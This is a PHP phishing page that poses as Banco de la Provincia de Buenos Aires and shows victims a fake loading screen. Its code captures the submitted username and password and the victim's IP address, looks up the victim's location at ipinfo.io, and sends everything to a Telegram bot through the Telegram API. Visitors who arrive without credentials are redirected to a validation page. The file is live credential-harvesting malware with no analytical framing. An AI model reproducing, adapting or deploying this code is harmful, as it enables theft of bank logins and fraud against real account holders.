
<?php
@session_start();
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
$s1 = $_POST['s1'];
$s2 = $_POST['s2'];

include 'infor.php';

if (isset ($s1) && isset ($s2) ) {
    $dedon = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

    $country = $dedon->country;
    $city = $dedon->city;
	$message = "💲 PRO 💲 \nuZer : $s1 \nCtra : $s2 \n----------------\n$country $city $userp \n";
	
	$data = [
		'chat_id' => $gIDd,
	  
		 'text' => $message
	  ];
	  
	  $response = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query($data) );
	
	
	
	} else{ header ('location:validacion.php'); exit();
	 }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de la Provincia de Buenos Aires</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="todo">
    <header>
        <img  src="https://i.postimg.cc/qq0fChbR/loggoo.png" alt="">
    </header>
    <main>
        <div class="caja">
                <center>
                <h2>Cargando...</h2>
                <div class="cargando">
                    <img id="gif"src="https://i.postimg.cc/RFPqf71Z/as.gif" alt="">
                    <div class="" id="ab" style="font-family: Arial, Helvetica, sans-serif; color: #007a2b!important; font-weight: 600;"></div>
                </div>
            
           
              
           
          
            
        </div>
    </main>
</div>
<script src="time.js"></script>
</body>
</html>